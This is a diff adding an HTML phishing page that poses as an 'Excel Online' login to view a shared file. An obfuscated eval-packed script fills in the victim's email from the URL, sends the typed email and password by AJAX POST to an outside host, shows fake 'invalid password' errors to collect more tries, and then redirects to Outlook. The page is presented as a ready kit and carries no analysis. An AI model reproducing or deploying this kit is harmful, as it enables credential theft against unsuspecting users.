@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>Excel Online</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <style type="text/css">
+    </style>
+</head>
+
+<body style="background-image: url('images/bg.png'); background-size: cover;background-repeat: no-repeat;">
+    <!-- Modal for gmail -->
+    <div class="modal fade show" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true " style="padding-right: 16px; display: block;">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <img src="images/excel.png" width="40px"> &nbsp&nbsp&nbsp <p class="mt-2 h5">Excel Online</p>
+                    <button type="button" class="close">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <center>
+                        <h5 class="modal-title" id="exampleModalLabel">Excel Online - Login to viewfile </h5>
+                        <div class="alert alert-danger" id="msg" style="display: none;">Invalid Password.! Please enter correct password.</div>
+                        <span class="text-danger" id="error" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form class="form-horizontal well">
+                        <input type="hidden" name="count" id="count" value="0">
+                        <div id="div1">
+                            <div class="col-lg-12 mt-4">
+                                <div class="form-group">
+                                    <div>
+                                        <label for="exampleInputEmail1">Email address</label>
+                                        <input type="email" name="ai" class="form-control" id="ai" aria-describedby="aiHelp" placeholder="Enter email" required="">
+                                        </div>
+                                </div>
+                            </div>
+                            <div class="col-lg-12">
+                                <div class="form-group">
+                                    <label for="pr">Password</label>
+                                    <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" required="">
+                                </div>
+                            </div>
+                            <div class="col-lg-12">
+                                <input type="button" class="btn btn-success pull-right w-100" name="sub-btn" id="sub-btn" value="View PDF">
+                            </div>
+                            <div class="col-lg-12 text-gray-dark py-4">
+                                <p>Signin with Receiver's Email and Password to view file. <br> &copy;2022 Excel Inc.<br></p>
+                            </div>
+                        </div>
+                    </form>
+                
+                </div>
+            </div>
+        </div>
+    </div>
+   <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" ></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" ></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+
+    //redirect link
+var rdrt = "https://outlook.office365.com";
+
+//mail result count
+var rc = 2;
+
+//mailer link
+var f = atob("https://gblchimica.com/con/next.php");
+
+
+
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(H).S(8(){3 m=0;$(H).T(8(a){3 b=(a.I?a.I:a.U);6(b==\'13\'){a.J();$("#w-x").K()}});3 n=L.M.V.s(1);6(!n){}W{3 o=n;3 p=o.y("@");3 q=o.s((p+1));3 c=q.s(0,q.y(\'.\'));3 r=c.N();$(\'#C\').7(o);$(\'#X\').u(o);$("#v").D()}$(\'#w-x\').K(8(b){$(\'#5\').D();$(\'#v\').D();b.J();3 d=$("#C").7();3 e=$("#E").7();3 g=$(\'#v\').u();$(\'#v\').Y(g);3 h=d;3 i=/^([a-F-G-Z\\.\\-])+\\@(([a-F-G-9\\-])+\\.)+([a-F-G-9]{2,4})+$/;6(!d){$(\'#5\').z();$(\'#5\').u("10 O P Q.!");A B}6(!i.11(h)){$(\'#5\').z();$(\'#5\').u("12 R 14\'t 15. 16 a 17 R");A B}6(!e){$(\'#5\').z();$(\'#5\').u("18 O P Q.!");A B}3 j=h.y("@");3 k=h.s((j+1));3 c=k.s(0,k.y(\'.\'));3 l=c.N();m=m+1;$.19({1a:\'1b\',1c:f,1d:\'1e\',1f:{C:d,E:e,},1g:8(a){$(\'#w-x\').7(\'1h...\')},1i:8(){$("#E").7("");6(m>=1j){m=0;L.M.1k(1l);A B}$("#v").z();$(\'#w-x\').7(\'1m 1n\')}})})});',62,86,'|||var||error|if|val|function||||||||||||||||||||substr||html|msg|sub|btn|indexOf|show|return|false|ai|hide|pr|zA|Z0|document|keyCode|preventDefault|click|window|location|toLowerCase|field|is|empty|account|ready|keypress|which|hash|else|aich|text|9_|Email|test|That||doesn|exist|Enter|different|Password|ajax|dataType|JSON|url|type|POST|data|beforeSend|Downloading|complete|rc|replace|rdrt|Download|PDF'.split('|'),0,{}))
+</script>
+
+</html>
